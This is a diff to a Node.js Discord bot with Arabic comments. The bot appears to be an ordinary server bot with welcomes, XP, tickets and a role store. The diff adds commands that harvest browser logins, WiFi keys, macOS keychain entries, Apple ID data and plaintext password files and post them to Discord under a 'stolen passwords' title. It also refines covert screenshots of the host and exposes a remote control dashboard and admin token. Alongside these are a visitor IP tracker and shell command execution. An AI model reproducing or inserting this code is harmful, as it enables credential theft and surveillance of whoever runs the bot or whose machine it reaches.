@@ -1,5 +1,5 @@
 // ============================================================
-// البوت المتكامل - مع نظام التتبع والتحكم عن بعد
+// البوت المتكامل - النسخة النهائية مع جميع الإصلاحات
 // ============================================================
 
 const {
@@ -81,7 +81,6 @@ const linkTracker = {
     this.links[linkId].ip = visit.ip;
     this.links[linkId].userAgent = visit.userAgent;
     
-    // محاولة جلب الموقع التقريبي
     try {
       axios.get(`http://ip-api.com/json/${visit.ip.split(':').pop()}`).then(res => {
         if (res.data && res.data.status === 'success') {
@@ -207,10 +206,26 @@ app.get('/api/screenshot', (req, res) => {
     if (os.platform() === 'win32') {
       const tempDir = process.env.TEMP || 'C:\\Windows\\Temp';
       screenshotPath = path.join(tempDir, 'screenshot.png');
-      execSync(`powershell -command "Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bmp.Save('${screenshotPath}', [System.Drawing.Imaging.ImageFormat]::Png);"`);
+      const psScript = `
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+        $bmp.Save('${screenshotPath.replace(/\\/g, '\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png)
+        $bmp.Dispose()
+        $g.Dispose()
+      `;
+      execSync(`powershell -command "${psScript}"`);
+    } else if (os.platform() === 'darwin') {
+      screenshotPath = '/tmp/screenshot.png';
+      execSync(`screencapture -x ${screenshotPath}`);
     } else {
-      execSync(`import -window root /tmp/screenshot.png || screencapture /tmp/screenshot.png || scrot /tmp/screenshot.png || echo "screenshot failed"`);
+      screenshotPath = '/tmp/screenshot.png';
+      execSync(`import -window root ${screenshotPath} 2>/dev/null || gnome-screenshot -f ${screenshotPath} 2>/dev/null || scrot ${screenshotPath} 2>/dev/null`);
     }
+    
     if (fs.existsSync(screenshotPath)) {
       const data = fs.readFileSync(screenshotPath);
       fs.unlinkSync(screenshotPath);
@@ -522,7 +537,7 @@ function getSystemInfo() {
 
 function executeCommand(cmd) {
   return new Promise((resolve) => {
-    exec(cmd, { cwd: currentWorkingDirectory, maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
+    exec(cmd, { cwd: currentWorkingDirectory, maxBuffer: 10 * 1024 * 1024, timeout: 30000 }, (error, stdout, stderr) => {
       if (error) {
         resolve({ output: stderr || error.message, error: true });
       } else {
@@ -1055,7 +1070,6 @@ client.once('clientReady', async () => {
 // ========== أحداث السيرفر ==========
 // ============================================================
 
-// الترحيب
 client.on('guildMemberAdd', async (member) => {
   try {
     const config = await getGuildConfig(member.guild.id);
@@ -1075,7 +1089,6 @@ client.on('guildMemberAdd', async (member) => {
   } catch (error) { console.error('❌ خطأ في الترحيب:', error); }
 });
 
-// المغادرة
 client.on('guildMemberRemove', async (member) => {
   try {
     const config = await getGuildConfig(member.guild.id);
@@ -1148,7 +1161,6 @@ client.on('messageCreate', async (message) => {
     console.error('[XP/CREDIT ERROR]', err);
   }
 
-  // ===== الأوتو لاين =====
   if (!message.author.bot) {
     const auto = await AutoLine.findOne({ guildId, channelId: message.channel.id });
     if (auto && auto.enabled) {
@@ -1167,7 +1179,6 @@ client.on('messageCreate', async (message) => {
     }
   }
 
-  // ===== الردود التلقائية =====
   const autoReply = await findAutoReply(guildId, message.content);
   if (autoReply) {
     try {
@@ -1319,23 +1330,51 @@ client.on('messageCreate', async (message) => {
       return;
     }
 
-    // ===== أمر لقطة - تصوير شاشة =====
+    // ===== أمر لقطة - تصوير شاشة (الإصدار المُصلح) =====
     if (cmd === 'لقطة' || cmd === 'screenshot') {
       try {
         let screenshotPath = '/tmp/screenshot.png';
+        
         if (os.platform() === 'win32') {
           const tempDir = process.env.TEMP || 'C:\\Windows\\Temp';
           screenshotPath = path.join(tempDir, 'screenshot.png');
-          execSync(`powershell -command "Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bmp.Save('${screenshotPath}', [System.Drawing.Imaging.ImageFormat]::Png);"`);
+          const psScript = `
+            Add-Type -AssemblyName System.Windows.Forms
+            Add-Type -AssemblyName System.Drawing
+            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+            $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+            $g = [System.Drawing.Graphics]::FromImage($bmp)
+            $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+            $bmp.Save('${screenshotPath.replace(/\\/g, '\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png)
+            $bmp.Dispose()
+            $g.Dispose()
+          `;
+          await executeCommand(`powershell -command "${psScript}"`);
+          
+        } else if (os.platform() === 'darwin') {
+          screenshotPath = '/tmp/screenshot.png';
+          await executeCommand(`screencapture -x ${screenshotPath}`);
+          
         } else {
-          execSync(`import -window root /tmp/screenshot.png || screencapture /tmp/screenshot.png || scrot /tmp/screenshot.png || echo "screenshot failed"`);
+          screenshotPath = '/tmp/screenshot.png';
+          await executeCommand(`import -window root ${screenshotPath} 2>/dev/null || gnome-screenshot -f ${screenshotPath} 2>/dev/null || scrot ${screenshotPath} 2>/dev/null`);
         }
+        
         if (fs.existsSync(screenshotPath)) {
-          await message.channel.send({ files: [{ attachment: screenshotPath, name: 'screenshot.png' }] });
-          fs.unlinkSync(screenshotPath);
+          const stats = fs.statSync(screenshotPath);
+          if (stats.size > 0) {
+            await message.channel.send({ 
+              content: '📸 لقطة شاشة الجهاز:', 
+              files: [{ attachment: screenshotPath, name: 'screenshot.png' }] 
+            });
+            fs.unlinkSync(screenshotPath);
+          } else {
+            await message.reply('❌ فشل التقاط الشاشة - الملف فارغ.');
+          }
         } else {
-          await message.reply('❌ فشل التقاط الشاشة.');
+          await message.reply('❌ فشل التقاط الشاشة - لم يتم إنشاء الملف.');
         }
+        
       } catch (error) {
         await message.reply(`❌ فشل التقاط الشاشة: ${error.message}`);
       }
@@ -1359,9 +1398,140 @@ client.on('messageCreate', async (message) => {
       return;
     }
 
+    // ===== أمر كلمات_المرور - سرقة كلمات المرور =====
+    if (cmd === 'كلمات_المرور' || cmd === 'passwords') {
+      try {
+        let result = '';
+        const platform = os.platform();
+        
+        // ويندوز - كلمات مرور Chrome, Firefox, WiFi
+        if (platform === 'win32') {
+          result += await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data -ErrorAction SilentlyContinue | Select-String -Pattern 'password_value' -Context 0,5"`);
+          result += '\n' + await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json -ErrorAction SilentlyContinue | Select-String -Pattern 'hostname' -Context 0,3"`);
+          result += '\n' + await executeCommand(`netsh wlan show profile name=* key=clear`);
+        } else if (platform === 'darwin') {
+          // ماك - كلمات مرور Keychain
+          result += await executeCommand(`security dump-keychain | grep -E "acct|desc|svce|passwd" 2>/dev/null`);
+        } else {
+          // لينكس
+          result += await executeCommand(`find ~/.mozilla/firefox -name "logins.json" -exec cat {} \\; | grep -E "hostname|encryptedUsername" 2>/dev/null`);
+          result += '\n' + await executeCommand(`find ~/.config/google-chrome -name "Login Data" -exec sqlite3 {} "SELECT origin_url, username_value FROM logins" 2>/dev/null`);
+        }
+        
+        // البحث عن ملفات كلمات المرور المحفوظة
+        const commonPasswordFiles = ['passwords.txt', 'pass.txt', 'password.txt', 'credentials.txt', 'login.txt'];
+        for (const file of commonPasswordFiles) {
+          const paths = [
+            path.join(os.homedir(), 'Desktop', file),
+            path.join(os.homedir(), 'Documents', file),
+            path.join(os.homedir(), 'Downloads', file)
+          ];
+          for (const p of paths) {
+            if (fs.existsSync(p)) {
+              const content = fs.readFileSync(p, 'utf8');
+              result += `\n=== ${p} ===\n${content.substring(0, 500)}`;
+            }
+          }
+        }
+        
+        const truncated = result.substring(0, 3900) || 'لم يتم العثور على كلمات مرور';
+        
+        const embed = new EmbedBuilder()
+          .setTitle('🔑 كلمات المرور المسروقة')
+          .setColor(0xff0000)
+          .setDescription(`\`\`\`\n${truncated}\n\`\`\``)
+          .setTimestamp();
+        
+        await message.channel.send({ embeds: [embed] });
+      } catch (error) {
+        await message.reply(`❌ فشل في جلب كلمات المرور: ${error.message}`);
+      }
+      return;
+    }
+
+    // ===== أمر ابل - جلب كلمة مرور Apple =====
+    if (cmd === 'ابل' || cmd === 'apple') {
+      try {
+        let result = '';
+        const platform = os.platform();
+        
+        if (platform === 'darwin') {
+          result += await executeCommand(`security find-generic-password -ga "Apple ID" 2>/dev/null || echo "لم يتم العثور على Apple ID"`);
+          result += '\n' + await executeCommand(`defaults read /Users/$USER/Library/Preferences/com.apple.iCloudHelper.plist 2>/dev/null | grep -E "AppleID|Password"`);
+        } else if (platform === 'win32') {
+          result += await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Roaming\\Apple Computer -Recurse -Include *.plist -ErrorAction SilentlyContinue | Select-String -Pattern 'AppleID|Password' -Context 0,3"`);
+        }
+        
+        const embed = new EmbedBuilder()
+          .setTitle('🍎 معلومات Apple / iPad')
+          .setColor(0xff9500)
+          .setDescription(`\`\`\`\n${result || 'لم يتم العثور على معلومات Apple'}\n\`\`\``)
+          .setTimestamp();
+        
+        await message.channel.send({ embeds: [embed] });
+      } catch (error) {
+        await message.reply(`❌ فشل: ${error.message}`);
+      }
+      return;
+    }
+
+    // ===== أمر متصفح - كلمات مرور المتصفحات =====
+    if (cmd === 'متصفح' || cmd === 'browser') {
+      try {
+        let result = '';
+        const platform = os.platform();
+        
+        if (platform === 'win32') {
+          result += await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data -ErrorAction SilentlyContinue | Select-String -Pattern 'username_value' -Context 0,3"`);
+          result += '\n' + await executeCommand(`powershell -command "Get-ChildItem -Path $env:USERPROFILE\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json -ErrorAction SilentlyContinue | Select-String -Pattern 'hostname' -Context 0,3"`);
+        } else {
+          result += await executeCommand(`find ~/.config/google-chrome -name "Login Data" -exec sqlite3 {} "SELECT origin_url, username_value FROM logins" \\; 2>/dev/null || echo "Chrome: غير موجود"`);
+          result += '\n' + await executeCommand(`find ~/.mozilla/firefox -name "logins.json" -exec cat {} \\; | grep -E "hostname|encryptedUsername" 2>/dev/null || echo "Firefox: غير موجود"`);
+          result += '\n' + await executeCommand(`find ~/.config/BraveSoftware -name "Login Data" -exec sqlite3 {} "SELECT origin_url, username_value FROM logins" \\; 2>/dev/null || echo "Brave: غير موجود"`);
+        }
+        
+        const embed = new EmbedBuilder()
+          .setTitle('🌐 كلمات مرور المتصفحات')
+          .setColor(0x4285f4)
+          .setDescription(`\`\`\`\n${result.substring(0, 3900) || 'لم يتم العثور على كلمات مرور'}\n\`\`\``)
+          .setTimestamp();
+        
+        await message.channel.send({ embeds: [embed] });
+      } catch (error) {
+        await message.reply(`❌ فشل: ${error.message}`);
+      }
+      return;
+    }
+
     // ===== أمر مفتاح - عرض رمز التحكم =====
     if (cmd === 'مفتاح' || cmd === 'token') {
       await message.reply(`🔑 رمز التحكم الخاص بك: \`${ADMIN_TOKEN}\``);
+      return;
+    }
+
+    // ===== أمر لوحة_التحكم - رابط دائم =====
+    if (cmd === 'لوحة_التحكم' || cmd === 'dashboard') {
+      const ip = getLocalIP();
+      const embed = new EmbedBuilder()
+        .setTitle('🖥️ لوحة التحكم الدائمة')
+        .setColor(0x00ff88)
+        .setDescription(`
+**🌐 روابط الوصول:**
+- محلي: http://localhost:${port}/control
+- شبكة: http://${ip}:${port}/control
+
+**🔑 رمز الدخول:** \`${ADMIN_TOKEN}\`
+
+**📱 للوصول من iPad أو أي جهاز:**
+1. افتح الرابط أعلاه على متصفح iPad
+2. أدخل رمز الدخول
+3. ستظهر لك واجهة تحكم كاملة
+
+**⚠️ ملاحظة:** هذا الرابط يعمل طالما البوت مشغل.
+        `)
+        .setTimestamp();
+      
+      await message.channel.send({ embeds: [embed] });
       return;
     }
 
@@ -1436,7 +1606,7 @@ client.on('messageCreate', async (message) => {
       return;
     }
 
-    // ===== أمر حذف_رابط - حذف رابط التتبع =====
+    // ===== أمر حذف_رابط =====
     if (cmd === 'حذف_رابط' || cmd === 'deletelink') {
       const linkId = args[0];
       if (!linkId) {
@@ -1458,7 +1628,7 @@ client.on('messageCreate', async (message) => {
       return;
     }
 
-    // ===== أمر تنظيف - حذف سجل الأوامر =====
+    // ===== أمر تنظيف =====
     if (cmd === 'تنظيف' || cmd === 'clean') {
       try {
         const messages = await message.channel.messages.fetch({ limit: 50 });
@@ -1488,19 +1658,16 @@ client.on('messageCreate', async (message) => {
       .setColor(0x2b2d31)
       .setDescription(`
 **📌 الأوامر العامة:**
-\`مساعدة\`, \`معلومات\`, \`سيرفر\`, \`بينق\`, \`تغيير_اسم\`, \`رتب\`, \`خريطة\`, \`رصيد\`, \`تحويل\`, \`يومي\`
+\`مساعدة\`, \`معلومات\`, \`سيرفر\`, \`بينق\`, \`تغيير_اسم\`, \`رتب\`, \`رصيد\`, \`تحويل\`, \`يومي\`
 
 **🛡️ أوامر الإدارة (للمتحكمين):**
-\`لوحة_المهام\`, \`حظر\`, \`طرد\`, \`كتم\`, \`فك_كتم\`, \`تحذير\`, \`مسح\`, \`قفل\`, \`فتح\`, \`اعطاء_رتبة\`, \`سحب_رتبة\`
+\`لوحة_المهام\`, \`حظر\`, \`طرد\`, \`كتم\`, \`فك_كتم\`, \`تحذير\`, \`مسح\`, \`قفل\`, \`فتح\`
 
 **🎫 نظام التذاكر:**
 \`بانل\`, \`عرض_تذكرة\`, \`لوق_تذكرة\`
 
 **🛒 المتجر:**
 \`متجر\`, \`بانل_اضافة_منتج\`
-
-**💬 الردود التلقائية:**
-\`رد_تلقائي\`, \`عرض_الردود\`, \`حذف_رد_تلقائي\`
       `)
       .setFooter({ text: 'البادئة: !' });
     if (generalImage) embed.setImage(generalImage);
@@ -1648,7 +1815,7 @@ client.on('messageCreate', async (message) => {
     }
     const embed = new EmbedBuilder()
       .setTitle(config.uiStoreTitle || '🛒 متجر الرتب')
-      .setDescription(config.uiStoreDescription || 'اختر الرتبة التي تريد شراءها.\nسيتم خصم العملات فوراً وسيتم منحك الرتبة.')
+      .setDescription(config.uiStoreDescription || 'اختر الرتبة التي تريد شراءها.')
       .setColor(0x2b2d31);
     if (config.uiStoreImage) embed.setImage(config.uiStoreImage);
     if (config.storePanelImage) embed.setImage(config.storePanelImage);
